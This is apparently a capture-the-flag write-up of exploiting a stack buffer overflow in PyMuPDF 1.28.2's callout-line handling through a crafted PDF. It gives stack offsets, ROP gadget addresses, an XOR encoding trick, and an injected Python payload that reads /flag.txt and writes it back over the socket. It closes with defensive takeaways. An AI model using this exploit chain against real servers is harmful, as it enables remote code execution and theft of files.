# PDF Strikes Again

**Category:** N-day · **Points:** 1000

> `http://35.253.49.248:5000/` — upload a PDF, the server "processes" it.

**Flag:** `kBxAc{___y37_4n07#3r_pdf_p4r51ng_vuln3r46117y_7h47_91v35_5#3ll_4nd_f|4g!!!___}`

---

## TL;DR

The service reads a custom `DocMeta` array out of every PDF page and turns every
pair of numbers into a point that it hands to **PyMuPDF 1.28.2**. That version
has a public stack buffer overflow in its callout-line handling
([PyMuPDF#5112](https://github.com/pymupdf/PyMuPDF/issues/5112)): it reserves
room for only **three points** but copies however many the caller supplies. The
challenge also builds Python as a **non-PIE** binary with exported symbols, so
with more than three points we overwrite the saved return address, ROP into the
binary, write a small Python payload into mapped-but-unused memory, and call
`PyRun_SimpleString()` to read `/flag.txt` and send it back over the live socket.

## What We're Given

The handout is a three-file Docker deployment:

```text
Dockerfile
docker-compose.yml
app.py
```

The interesting logic is in `process_pdf()` (`app.py`):

```python
raw = doc.xref_get_key(xref, "DocMeta")
flat_bits = [int(v) for v in raw[1].strip("[]").split()]

pts = []
for i in range(0, len(flat_bits), 2):
    lo_bits = flat_bits[i]
    hi_bits = flat_bits[i + 1]
    x = struct.unpack("<f", struct.pack("<I", lo_bits & 0xFFFFFFFF))[0]
    y = struct.unpack("<f", struct.pack("<I", hi_bits & 0xFFFFFFFF))[0]
    pts.append((x, y))

rect = pymupdf.Rect(50, 50, 200, 150)
page.add_freetext_annot(rect, "processed", callout=pts)
```

Two things stand out:

1. Each number is interpreted as the **raw 32-bit bit pattern** of a float — so
   one point (two floats, 8 bytes) is really a controllable 64-bit value, ideal
   for staging pointers and ROP gadgets.
2. There is **no limit** on how many points may be supplied.

## Initial Recon

The Dockerfile pins the target version and gives the bug away:

```dockerfile
RUN python3 -m pip install ... pymupdf==1.28.2
```

PyMuPDF 1.28.2 is affected by the publicly reported `JM_set_annot_callout_line`
stack overflow. The Dockerfile also builds Python 3.13.2 from source and relinks
it with `-no-pie -Xlinker -export-dynamic`:

- **No PIE** → Python's code sits at stable addresses despite ASLR.
- **Exported symbols** → functions like `PyRun_SimpleString` are directly
  reachable in the executable.

I rebuilt the image from the Dockerfile and pulled out `python3.13` and
`_extra.so`. Disassembling `_extra.so` showed the vulnerable function inlined
into its wrapper: the point buffer starts at `rsp+0x40`, the saved return
address sits at `rsp+0x88`.

## The Vulnerability / Core Concept

The vulnerable MuPDF code is essentially:

```cpp
static void JM_set_annot_callout_line(mupdf::PdfAnnot& annot,
                                      PyObject *callout, int count) {
    fz_point points[3];                       // room for 3
    for (int i = 0; i < count; i++) {         // loops to attacker count
        p = JM_point_from_py(PyTuple_GetItem(callout, i));
        points[i] = fz_make_point(p.x, p.y);
    }
    mupdf::pdf_set_annot_callout_line(annot, points, count);
}
```

`points` holds three entries but the loop runs to the attacker-controlled
`count`. Four points already write out of bounds; enough points overwrite saved
registers and finally the saved instruction pointer. Since each point is 8
bytes, the stack layout is:

| Point | Stack location | Overwrites |
|---:|---:|---|
| 0–2 | `rsp+0x40`–`0x57` | legitimate 3-point array |
| 3 | `rsp+0x58` | local data |
| 4–8 | `rsp+0x60`–`0x80` | saved `rbx`/`rbp`/`r12`/`r13`/`r14` |
| **9** | **`rsp+0x88`** | **saved RIP** |

So the **tenth point** becomes the first address in our ROP chain.

## Building the Exploit

The stack is non-executable, so we use **return-oriented programming**. The
useful fixed gadgets/symbols from the rebuilt non-PIE Python binary:

| Purpose | Address |
|---|---:|
| `ret` | `0x41d016` |
| `pop rdi; ret` | `0x41e9d7` |
| `pop rsi; ret` | `0x42a991` |
| `pop rax; ret` | `0x53a26e` |
| `xor rax, rsi; ret` | `0x53eeef` |
| `mov [rdi], rax; ret` | `0x46ec45` |
| `PyRun_SimpleString` | `0x54b0c0` |

**The floating-point problem.** Because our integers are converted to floats
and run through MuPDF's point handling, ASCII chunks that happen to be huge
floats get normalized and lose their bit pattern. The fix is to XOR-encode any
word above `0x4EFFFFFF` so both halves survive as valid coordinates, then
reconstruct in the chain:

```python
word_mask = 0x40000000 if word > 0x4EFFFFFF else 0
encoded_word = word ^ word_mask
```

```text
pop rax        # encoded text
pop rsi        # mask
xor rax, rsi   # original text
pop rdi        # destination address
mov [rdi], rax # store
```

Repeating that writes the full Python payload at `0x91bd00` — past the binary's
real data but inside the still-mapped, writable final page (ordinary `.bss`
holds live interpreter structs and crashes if clobbered).

**Exfil.** Rather than a reverse shell, the injected Python reads the flag and
blasts an HTTP response onto every plausible file descriptor; one of them is the
socket that uploaded the PDF:

```python
import os
x = open('/flag.txt', 'rb').read()
r = (b'HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\n'
     b'Content-Length: ' + str(len(x)).encode() + b'\r\n\r\n' + x)
for i in range(3, 32):
    try: os.write(i, r)
    except: pass
os._exit(0)   # don't unwind the smashed stack
```

The malicious PDF itself is tiny — a catalog, a page tree, and one page whose
`/DocMeta` array carries the chain as decimal 32-bit halves. The first nine
points are padding; point 9 is the first `ret`. Full generator + sender:
[`exploit.py`](exploit.py) (sample output PDF: [`exploit.pdf`](exploit.pdf)).

## Running It

```bash
python3 exploit.py http://35.253.49.248:5000/
```

```text
[+] wrote exploit.pdf (2985 bytes)
kBxAc{___y37_4n07#3r_pdf_p4r51ng_vuln3r46117y_7h47_91v35_5#3ll_4nd_f|4g!!!___}
```

`python3 exploit.py --generate-only` just builds the PDF without sending it.

## Key Takeaways

- A length check as small as `if len(callout) not in (2, 3)` would have killed
  the corruption.
- Reinterpreting attacker-controlled integers as raw float bits before handing
  them to native code is dangerous.
- `-no-pie` on the main executable guts most of ASLR's value.
- Exporting the whole Python runtime hands an attacker `PyRun_SimpleString` — no
  need to hand-roll syscalls.
- After code exec, a clean return isn't required: write the answer to the live
  socket and `os._exit(0)`.
